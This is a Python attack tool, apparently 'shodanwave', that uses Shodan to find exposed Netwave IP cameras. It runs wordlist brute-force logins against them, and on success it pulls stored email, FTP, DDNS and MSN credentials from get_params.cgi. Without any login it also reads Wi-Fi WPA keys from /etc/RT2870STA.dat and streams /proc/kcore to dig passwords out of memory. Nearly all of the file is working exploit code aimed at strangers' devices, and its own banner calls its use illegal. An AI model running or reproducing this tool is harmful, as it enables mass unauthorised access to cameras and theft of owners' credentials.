#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import sys
import os
import time
import subprocess
import signal
from colored import attr, fg, stylize

figlet_header = """
     _               _
    | |             | |
 ___| |__   ___   __| | __ _ _ ____      ____ ___   _____
/ __| '_ \ / _ \ / _` |/ _` | '_ \ \ /\ / / _` \ \ / / _ \\
\__ \ | | | (_) | (_| | (_| | | | \ V  V / (_| |\ V /  __/
|___/_| |_|\___/ \__,_|\__,_|_| |_|\_/\_/ \__,_| \_/ \___|
"""

try:
    import shodan
    import requests
    import tailer
except ImportError as e:
    print("Error: %s \n" % (e))
    print("Try this ... pip install -r /path/to/requirements.txt")


def main():
    print("{}".format(stylize(figlet_header, fg("yellow"))))
    print(stylize("This tool is successfully connected to shodan service.",
                  fg("red")))
    print(stylize("Information the use of this tool is illegal, not bad.",
                  fg("red")))

    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-s',
        '--search',
        dest='search',
        default='Netwave IP Camera',
        type=str,
        help='Default Netwave IP Camera')
    parser.add_argument(
        '-u',
        '--username',
        dest="username",
        type=argparse.FileType('r'),
        help='Select your usernames wordlist')
    parser.add_argument(
        '-w',
        '--wordlist',
        dest="password",
        type=argparse.FileType('r'),
        help='Select your passwords wordlist')
    parser.add_argument(
        '-k',
        '--shodan',
        dest="address",
        default='',
        type=str,
        help='Shodan API key')
    parser.add_argument(
        '-t', '--output', dest="output", default='', type=str, help='Log File')
    parser.add_argument(
        '-l',
        '--limit',
        dest="limit",
        type=str,
        help='Limit the number of registers responsed by Shodan')
    parser.add_argument(
        '-o',
        '--offset',
        dest="offset",
        type=str,
        help='Shodan skips this number of registers from response')

    args = parser.parse_args()

    global filename
    filename = args.output

    try:

        if sys.argv[2] == "-h" or sys.argv[2] == "--help":
            # print "Usage: python shodanwave.py --help"
            sys.exit(0)
    except Exception as e:
        print("Usage: python shodanwave.py --help")
        sys.exit(0)

    def signal_handler(signal, frame):
        print('\nclearing up..')
        os.system("rm -rf tmpstream.txt")
        os.system("rm -rf tmpstrings.out")
        os.system("killall -9 wget")
        os.system("killall -9 tail")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    def NetworkSearchosts():

        exploit = True
        found = False

        macaddr = ""
        email_user = ''
        email_pwd = ''

        ftp_user = ''
        ftp_pwd = ''
        ftp_svr = ''
        ftp_port = ''

        ddns_user = ''
        ddns_pwd = ''
        ddns_host = ''
        ddns_proxy_svr = ''

        msn_user = ''
        msn_pwd = ''

        try:

            shodanapi = shodan.Shodan(args.address)
            api = shodanapi.search(
                args.search, limit=args.limit, offset=args.offset)
            total = api.get('total')

            print(stylize("[+] Shodan successfully Connected.", fg("green")))
            print(stylize("[+] Netwave Exploit Enabled.", fg("green")))
            print(stylize("[+] Netwave IP Camera Found: {}".format(total),
                          fg("green")))

            if args.username or args.password:
                usernames = args.username.readlines()
                passwords = args.password.readlines()

                print(stylize("[+] Passwords loaded: {}".format(
                    len(passwords)), fg("green")))
                pass

            ShodanModuleExploit = input(
                stylize("[!] Disable password discovery module? (Yes/no): ",
                        fg("yellow")))

            if ShodanModuleExploit.upper(
            ) == "YES" or ShodanModuleExploit.upper() == "Y":
                print(stylize("[-] Netwave exploit disabled.", fg("red")))
                exploit = False

            while True:

                for hosts in api['matches']:

                    host = hosts.get('ip_str')
                    port = hosts.get('port')
                    city = hosts['location']['city'] or 'n/a'
                    country = hosts['location']['country_name'] or 'n/a'
                    org = hosts.get('org', 'n/a')
                    hostnames = hosts.get('hostnames', 'n/a')
                    product = hosts.get('product', 'n/a')

                    try:

                        path = "snapshot.cgi"
                        url = "http://%s:%s/%s" % (host, port, path)

                        print(
                            "[+] Launching brute force on host http://%s:%s" %
                            (host, port))
                        for administrator in usernames:
                            administrator = administrator.strip()
                            for password in passwords:

                                password = password.strip()

                                headers = {
                                    'User-Agent':
                                    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36"
                                }

                                request = requests.get(
                                    url,
                                    auth=(administrator, password),
                                    headers=headers,
                                    timeout=0.3)

                                status = request.status_code

                                if status == 200:

                                    exploit = False
                                    found = True

                                    print(stylize(
                                        "[+] Password Found {}@{}".format(
                                            administrator, password),
                                        fg("green"), attr("bold")))
                                    print(stylize(
                                        "[!] Trying to get more information",
                                        fg("yellow")))

                                    try:

                                        url = "http://%s:%s/get_params.cgi" % (
                                            host, port)

                                        headers = {
                                            'User-Agent':
                                            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36"
                                        }

                                        request = requests.get(
                                            url,
                                            headers=headers,
                                            auth=(administrator, password),
                                            timeout=0.3)

                                        response = request.text.split(";\n")

                                        if status == 200:
                                            for content in response:
                                                if content.startswith(
                                                        "var mail_user="):
                                                    content = content.split(
                                                        "'")
                                                    email_user = content[1]
                                                elif content.startswith(
                                                        "var mail_pwd="):
                                                    content = content.split(
                                                        "'")
                                                    email_pwd = content[1]
                                                elif content.startswith(
                                                        "var ddns_user="):
                                                    content = content.split(
                                                        "'")
                                                    ddns_user = content[1]
                                                elif content.startswith(
                                                        "var ddns_pwd="):
                                                    content = content.split(
                                                        "'")
                                                    ddns_pwd = content[1]
                                                elif content.startswith(
                                                        "var ddns_host="):
                                                    content = content.split(
                                                        "'")
                                                    ddns_host = content[1]
                                                elif content.startswith(
                                                        "var ddns_proxy_svr="):
                                                    content = content.split(
                                                        "'")
                                                    ddns_proxy_svr = content[1]
                                                elif content.startswith(
                                                        "var ftp_svr="):
                                                    content = content.split(
                                                        "'")
                                                    ftp_svr = content[1]
                                                elif content.startswith(
                                                        "var ftp_port="):
                                                    content = content.split(
                                                        "=")
                                                    ftp_port = content[1]
                                                elif content.startswith(
                                                        "var ftp_user="):
                                                    content = content.split(
                                                        "'")
                                                    ftp_user = content[1]
                                                elif content.startswith(
                                                        "var ftp_pwd="):
                                                    content = content.split(
                                                        "'")
                                                    ftp_pwd = content[1]
                                                elif content.startswith(
                                                        "var msn_user="):
                                                    content = content.split(
                                                        "'")
                                                    msn_user = content[1]
                                                elif content.startswith(
                                                        "var msn_pwd="):
                                                    content = content.split(
                                                        "'")
                                                    msn_pwd = content[1]
                                            if not (email_user == ''):
                                                print(stylize(
                                                    "[+] Email: {}:{}".format(
                                                        email_user, email_pwd),
                                                    fg("green")))
                                            if not (ftp_user == ''):
                                                print(stylize(
                                                    "[+] FTP: ftp://{}:{}@{}:{}".
                                                    format(
                                                        ftp_user, ftp_pwd,
                                                        ftp_svr, ftp_port)))
                                            if not (ddns_user == ''):
                                                print(stylize(
                                                    "[+] DNS: http://{}:{}@{}:{}".
                                                    format(
                                                        ddns_user, ddns_pwd,
                                                        ddns_host,
                                                        ddns_proxy_svr)))
                                            if not (msn_user == ''):
                                                print(stylize(
                                                    "[+] MSN: {}@{}".format(
                                                        msn_user, msn_pwd)))
                                    except Exception as e:
                                        print(stylize(
                                            "[-] {} not found ".format(url),
                                            fg("red")))
                                    break
                                else:
                                    found = False
                                    if ShodanModuleExploit.upper(
                                    ) == "YES" or ShodanModuleExploit.upper(
                                    ) == "Y":
                                        exploit = False
                                    else:
                                        exploit = True

                        if not (found):
                            if ShodanModuleExploit.upper(
                            ) == "YES" or ShodanModuleExploit.upper() == "Y":
                                exploit = False
                            else:
                                exploit = True
                                print(stylize("[!] Password not found",
                                              fg("red"), attr("bold")))
                    except Exception as e:
                        print(stylize("[-] {} not found".format(url),
                                      fg("red")))

                    print(stylize("[!] Getting System Information",
                                  fg("yellow")))
                    print(stylize("[!] Getting Wireless System Information",
                                  fg("yellow")))

                    try:

                        wireless = "http://%s:%s/get_status.cgi" % (host, port)
                        headers = {
                            'User-Agent':
                            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36"
                        }

                        response = requests.get(
                            wireless, headers=headers, timeout=0.3)
                        status = response.status_code
                        content = response.text.split(';\n')

                        if status == 200:
                            for macaddress in content:
                                if macaddress.startswith("var id="):
                                    macaddress = macaddress.split("'")
                                    macaddr = macaddress[1]

                                    print(stylize(
                                        "[+] Mac address found {}".format(
                                            macaddr), fg("yellow")))

                        else:
                            print(stylize("[-] Getting mac address",
                                          fg("red")))
                    except Exception as e:
                        print(stylize("[-] {} not found".format(wireless),
                                      fg("red")))

                    print(
                        """[+] Host: http://%s:%s\n[+] Country: %s\n[+] City: %s\n[+] Organization: %s\n[+] Product: %s"""
                        % (host, port, country, city, org, product))

                    log(host, port, country, city, org, product)

                    try:

                        url = "http://%s:%s//etc/RT2870STA.dat" % (host, port)

                        headers = {
                            'User-Agent':
                            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36"
                        }

                        response = requests.get(
                            url, headers=headers, timeout=0.3)
                        content = response.text.split("\n")

                        status = response.status_code

                        if status == 200:
                            for crendential in content:
                                if crendential.find(
                                        "WPAPSK") != -1 or crendential.find(
                                            "SSID") != -1:
                                    crendential = crendential.replace(
                                        "=", ": ")
                                    print(stylize("[+] {}".format(crendential),
                                                  fg("green"), attr("bold")))
                        else:
                            print(stylize("[!] Wireless lan is disabled..",
                                          fg("red"), attr("bold")))
                    except Exception as e:
                        print(stylize("[!] Error: Wireless lan is disabled..",
                                      fg("red")))

                    try:

                        url = "http://%s:%s//proc/kcore" % (host, port)
                        done = 0
                        linecount = 0

                        if exploit:

                            print(stylize(
                                "[+] Starting to read memory dump.. this could take a few minutes",
                                fg("red")))
                            proc = subprocess.Popen(
                                "wget -qO- " + url + " >> tmpstream.txt",
                                shell=True,
                                preexec_fn=os.setsid)
                            os.system('echo "" > tmpstrings.out')
                            time.sleep(1)
                            proc2 = subprocess.Popen(
                                "tail -f tmpstream.txt | strings >>tmpstrings.out",
                                shell=True,
                                preexec_fn=os.setsid)
                            print(stylize("[+] CTRL+C to exit..",
                                          attr("bold")))

                            while 1:
                                sys.stdout.flush()
                                if os.stat('tmpstrings.out').st_size <= 1024:
                                    sys.stdout.write(
                                        stylize("binary data: " + str(
                                            os.stat('tmpstream.txt').st_size) +
                                                "\r", fg("green")))
                                else:
                                    sys.stdout.flush()
                                    print(
                                        "[+] Strings in binary data found.. password should be around line 10000"
                                    )
                                    for line in tailer.follow(
                                            open('tmpstrings.out', 'r')):
                                        if done == 0:
                                            linecount += 1
                                            if line == macaddr:
                                                sys.stdout.flush()
                                                done = 1
                                                print(stylize(
                                                    "[+] Mac address triggered.. printing the following dumps, could leak username and passwords..",
                                                    fg("green")))
                                            else:
                                                sys.stdout.write(
                                                    str(linecount) + "\r")
                                        elif done == 1:
                                            done = 2
                                            print(stylize(
                                                "[+] Firstline.. {}".format(
                                                    line), fg("green")))
                                        elif done == 2:
                                            done = 3
                                            print(stylize(
                                                "[+] Possible username: {}".
                                                format(line), fg("gree")))
                                        elif done == 3:
                                            done = 4
                                            print(stylize(
                                                "[+] Possible password: {}".
                                                format(line), fg("green")))
                                        elif done == 4:
                                            done = 0
                                            print(stylize(
                                                "[+] Following line..\n\n{}".
                                                format(line), fg("green")))
                                        else:
                                            pass
                            signal.pause()
                    except:
                        print(stylize(
                            "[-] Victim isnt vulnerable for a memory leak, exiting..",
                            fg("red")))
                print(stylize("[+] Done!", fg("green")))
                return True
        except shodan.APIError as e:
            print(stylize("[-] Error: {}".format(e), fg("red")))
            sys.exit(0)

    NetworkSearchosts()


def log(host, port, country, city, org, product):

    file = open(filename, 'a')
    out = "[+] Host: http://%s:%s\n[+] Country: %s\n[+] City: %s\n[+] Organization: %s\n[+] Product: %s\n " % (
        host, port, country, city, org, product)
    file.write(out.encode('utf-8'))
    file.write("*****************" + "\n")
    file.close()


if __name__ == "__main__":
    main()
